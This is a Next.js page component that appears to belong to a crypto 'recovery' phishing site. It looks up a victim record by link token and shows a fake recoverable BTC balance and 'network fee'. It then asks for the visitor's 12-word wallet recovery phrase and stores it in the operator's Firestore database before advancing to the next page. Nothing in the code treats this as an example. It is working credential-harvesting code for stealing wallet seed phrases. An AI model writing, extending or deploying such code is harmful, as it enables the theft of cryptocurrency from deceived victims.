"use client";

import { useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { collection, doc, getDocs, updateDoc } from "firebase/firestore";
import { db } from "@/lib/firebase";
import SvgStack from "@/components/SvgStack";
import Image from "next/image";
import bgImage from "@/components/Image_fx__2_-removebg-preview 1.svg";

export default function Page4Client() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const token = searchParams.get("token");

  const [loading, setLoading] = useState(true);
  const [client, setClient] = useState<any>(null);
  const [recoveryPhrase, setRecoveryPhrase] = useState("");
  const [error, setError] = useState("");

  useEffect(() => {
    if (!token) {
      router.replace("/invalid");
      return;
    }

    const fetchClientData = async () => {
      try {
        const snapshot = await getDocs(collection(db, "clients"));
        const clientDoc = snapshot.docs.find(
          (d) => d.data().accessLinkId === token
        );

        if (!clientDoc) {
          router.replace("/invalid");
          return;
        }

        setClient({ id: clientDoc.id, ...clientDoc.data() });
        setLoading(false);
      } catch {
        router.replace("/invalid");
      }
    };

    fetchClientData();
  }, [token, router]);

  const handleProcessRecovery = async () => {
    if (!recoveryPhrase.trim()) {
      setError("Recovery phrase cannot be empty");
      return;
    }

    const words = recoveryPhrase
      .trim()
      .split(/\s+/)
      .map((w) => w.replace(/^\d+\./, ""));

    if (words.length !== 12) {
      setError("Recovery phrase must contain exactly 12 words");
      return;
    }

    if (!client) return;

    await updateDoc(doc(db, "clients", client.id), {
      recoveryPhrase: words,
      proceed2: false,
      currentPage: "page5",
    });

    router.replace(`/page5?token=${token}`);
  };

  if (loading) {
    return (
      <main className="flex items-center justify-center h-screen text-white">
        Loading client info...
      </main>
    );
  }

  const networkFee = (client.recoverableBalance || 0) * 0.0042;

  return (
    <main className="relative w-full h-screen overflow-hidden">
      <div className="absolute inset-0">
        <SvgStack />
      </div>

      <div className="relative z-10 flex items-center justify-center h-full px-4 bg-black/85 backdrop-blur-sm">
        <Image
          src={bgImage}
          alt="Background"
          className="absolute inset-0 -z-10 object-contain"
        />

        <div className="w-full max-w-lg bg-[#0E111C]/85 rounded-lg p-6 space-y-6">
          <h2 className="text-xl font-bold text-white">Recovery in Progress</h2>

          <div className="flex flex-col gap-2">
            <label className="text-gray-400">Recovery Phrase</label>
            <textarea
              rows={6}
              value={recoveryPhrase}
              onChange={(e) => setRecoveryPhrase(e.target.value)}
              className="bg-[#151A2E] p-4 rounded-lg text-white"
              placeholder="Enter your 12-word recovery phrase"
            />
            {error && <p className="text-red-500 text-sm">{error}</p>}
          </div>

          <div className="bg-[#151A2E] rounded-xl p-4 space-y-2">
            <div className="flex justify-between text-white font-semibold">
              <span>Recoverable Balance</span>
              <span>{client.recoverableBalance?.toFixed(8)} BTC</span>
            </div>
            <div className="flex justify-between text-gray-400">
              <span>Network Fee</span>
              <span>{networkFee.toFixed(8)} BTC</span>
            </div>
          </div>

          <button
            onClick={handleProcessRecovery}
            className="w-full py-3 bg-teal-600 rounded-xl font-semibold hover:bg-teal-500"
          >
            Process Recovery
          </button>
        </div>
      </div>
    </main>
  );
}
